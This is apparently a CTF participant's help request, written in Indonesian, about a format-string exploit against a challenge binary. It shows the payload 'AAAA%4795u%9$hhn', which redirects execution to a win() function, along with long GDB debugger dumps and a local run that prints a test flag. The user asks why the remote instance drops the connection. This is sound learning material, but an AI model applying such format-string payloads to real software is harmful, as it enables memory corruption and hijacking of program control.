kak ini saya ada stack check fail atau apa yaa, payload saya `10` sama `AAAA%4795u%9$hhn`

```
(gdb) b *win+0
Breakpoint 1 at 0x12bf
(gdb) b *vuln+312
Breakpoint 2 at 0x149d
(gdb) r
Starting program: /home/d3ffr3u5-picoctf/chall 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.
Pertama, masukkan umur kalian untuk disesuaikan sama input (ğŸ˜…): 10
Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:
AAAA%4795u%9$hhn
Kamu menginput: AAAA                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
[ Legend: Modified register | Code | Heap | Stack | String ]
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf730  â†’  0x00007fc0250c9600  â†’  0x0000000000000000
$rbp   : 0x00007ffe04caf770  â†’  0x00007ffe04caf780  â†’  0x0000000000000001
$rsi   : 0x00007ffe04cad610  â†’  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  â†’  0x00007fc024f14050  â†’  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c49d  â†’  <vuln+0138> leave 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  â†’  0x00007ffe04cb1759  â†’  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  â†’  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007fc02512a040  â†’  0x00007fc02512b2e0  â†’  0x000056329d10b000  â†’   jg 0x56329d10b047
[ Legend: Modified register | Code | Heap | Stack | String ]
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf730  â†’  0x00007fc0250c9600  â†’  0x0000000000000000
$rbp   : 0x00007ffe04caf770  â†’  0x00007ffe04caf780  â†’  0x0000000000000001
$rsi   : 0x00007ffe04cad610  â†’  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  â†’  0x00007fc024f14050  â†’  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c49d  â†’  <vuln+0138> leave 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  â†’  0x00007ffe04cb1759  â†’  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  â†’  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007fc02512a040  â†’  0x00007fc02512b2e0  â†’  0x000056329d10b000  â†’   jg 0x56329d10b047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
0x00007ffe04caf730â”‚+0x0000: 0x00007fc0250c9600  â†’  0x0000000000000000    â† $rsp
0x00007ffe04caf738â”‚+0x0008: 0x0000001068f3c5ad
0x00007ffe04caf740â”‚+0x0010: 0x0000000f00000001
0x00007ffe04caf748â”‚+0x0018: 0x00007ffe04caf778  â†’  0x000056329d10c2bf  â†’  <win+0000> endbr64 
0x00007ffe04caf750â”‚+0x0020: 0x3937342541414141
0x00007ffe04caf758â”‚+0x0028: 0x6e68682439257535
0x00007ffe04caf760â”‚+0x0030: 0x00007ffe04caf898  â†’  0x00007ffe04cb1759  â†’  "/home/d3ffr3u5-picoctf/chall"
0x00007ffe04caf768â”‚+0x0038: 0xfb6cf576f7c61c00
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
   0x56329d10c48d <vuln+0128>      xor    rcx, QWORD PTR fs:0x28
   0x56329d10c496 <vuln+0131>      je     0x56329d10c49d <vuln+312>
   0x56329d10c498 <vuln+0133>      call   0x56329d10c0e0 <__stack_chk_fail@plt>
 â†’ 0x56329d10c49d <vuln+0138>      leave  
   0x56329d10c49e <vuln+0139>      ret    
   0x56329d10c49f                  nop    
   0x56329d10c4a0 <__libc_csu_init+0000> endbr64 
   0x56329d10c4a4 <__libc_csu_init+0004> push   r15
   0x56329d10c4a6 <__libc_csu_init+0006> lea    r15, [rip+0x28cb]        # 0x56329d10ed78
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
[#0] Id 1, Name: "chall", stopped 0x56329d10c49d in vuln (), reason: BREAKPOINT
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
[#0] 0x56329d10c49d â†’ vuln()
[#1] 0x56329d10c2bf â†’ main()
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
(gdb) dereference 
0x00007ffe04caf730â”‚+0x0000: 0x00007fc0250c9600  â†’  0x0000000000000000    â† $rsp
0x00007ffe04caf738â”‚+0x0008: 0x0000001068f3c5ad
0x00007ffe04caf740â”‚+0x0010: 0x0000000f00000001
0x00007ffe04caf748â”‚+0x0018: 0x00007ffe04caf778  â†’  0x000056329d10c2bf  â†’  <win+0000> endbr64 
0x00007ffe04caf750â”‚+0x0020: 0x3937342541414141
0x00007ffe04caf758â”‚+0x0028: 0x6e68682439257535
0x00007ffe04caf760â”‚+0x0030: 0x00007ffe04caf898  â†’  0x00007ffe04cb1759  â†’  "/home/d3ffr3u5-picoctf/chall"
0x00007ffe04caf768â”‚+0x0038: 0xfb6cf576f7c61c00
0x00007ffe04caf770â”‚+0x0040: 0x00007ffe04caf780  â†’  0x0000000000000001    â† $rbp
0x00007ffe04caf778â”‚+0x0048: 0x000056329d10c2bf  â†’  <win+0000> endbr64 
(gdb) 
```

terus disini saya continue

```
(gdb) c
[ Legend: Modified register | Code | Heap | Stack | String ]
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf780  â†’  0x0000000000000001
$rbp   : 0x00007ffe04caf780  â†’  0x0000000000000001
$rsi   : 0x00007ffe04cad610  â†’  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  â†’  0x00007fc024f14050  â†’  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c2bf  â†’  <win+0000> endbr64 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  â†’  0x00007ffe04cb1759  â†’  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  â†’  <main+0000> endbr64 
$r14   : 0x0               
[ Legend: Modified register | Code | Heap | Stack | String ]
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€
$rax   : 0x12c5            
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffe04caf780  â†’  0x0000000000000001
$rbp   : 0x00007ffe04caf780  â†’  0x0000000000000001
$rsi   : 0x00007ffe04cad610  â†’  "AAAA                                              [...]"
$rdi   : 0x00007ffe04cad4f0  â†’  0x00007fc024f14050  â†’  <funlockfile+0000> endbr64 
$rip   : 0x000056329d10c2bf  â†’  <win+0000> endbr64 
$r8    : 0x12c5            
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x00007ffe04caf898  â†’  0x00007ffe04cb1759  â†’  "/home/d3ffr3u5-picoctf/chall"
$r13   : 0x000056329d10c249  â†’  <main+0000> endbr64 
$r14   : 0x0               
$r15   : 0x00007fc02512a040  â†’  0x00007fc02512b2e0  â†’  0x000056329d10b000  â†’   jg 0x56329d10b047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€
0x00007ffe04caf780â”‚+0x0000: 0x0000000000000001   â† $rsp, $rbp
0x00007ffe04caf788â”‚+0x0008: 0x00007fc024edbd90  â†’  <__libc_start_call_main+0080> mov edi, eax
0x00007ffe04caf790â”‚+0x0010: 0x0000000000000000
0x00007ffe04caf798â”‚+0x0018: 0x000056329d10c249  â†’  <main+0000> endbr64 
0x00007ffe04caf7a0â”‚+0x0020: 0x0000000100000000
0x00007ffe04caf7a8â”‚+0x0028: 0x00007ffe04caf898  â†’  0x00007ffe04cb1759  â†’  "/home/d3ffr3u5-picoctf/chall"
0x00007ffe04caf7b0â”‚+0x0030: 0x0000000000000000
0x00007ffe04caf7b8â”‚+0x0038: 0xb42f49020954b724
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:x86:64 â”€â”€â”€â”€
   0x56329d10c2b0 <main+0067>      call   0x56329d10c365 <vuln>
   0x56329d10c2b5 <main+006c>      mov    edi, 0x1
   0x56329d10c2ba <main+0071>      call   0x56329d10c150 <exit@plt>
 â†’ 0x56329d10c2bf <win+0000>       endbr64 
   0x56329d10c2c3 <win+0004>       push   rbp
   0x56329d10c2c4 <win+0005>       mov    rbp, rsp
   0x56329d10c2c7 <win+0008>       sub    rsp, 0x120
   0x56329d10c2ce <win+000f>       mov    rax, QWORD PTR fs:0x28
   0x56329d10c2d7 <win+0018>       mov    QWORD PTR [rbp-0x8], rax
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€
[#0] Id 1, Name: "chall", stopped 0x56329d10c2bf in win (), reason: BREAKPOINT
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€
[#0] 0x56329d10c2bf â†’ win()
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
(gdb)
```

nah ini kan dah di `win` kan kak, tapi kok kalau saya jalanin lokal emang dah muncul output `Semoga masih gampang banged yh` sama flag,
tapi di instance aslinya kok outputnya cuma sampai `Kamu menginput: AAAA` terus malah `Ncat: Connection reset by peer.`...

```
$ ./chall                              
Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.
Pertama, masukkan umur kalian untuk disesuaikan sama input (ğŸ˜…): 10
Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:
AAAA%4795u%9$hhn
Kamu menginput: AAAA  2871707968Semoga masih gampang banged yh
COMPFEST16{testflag}
```
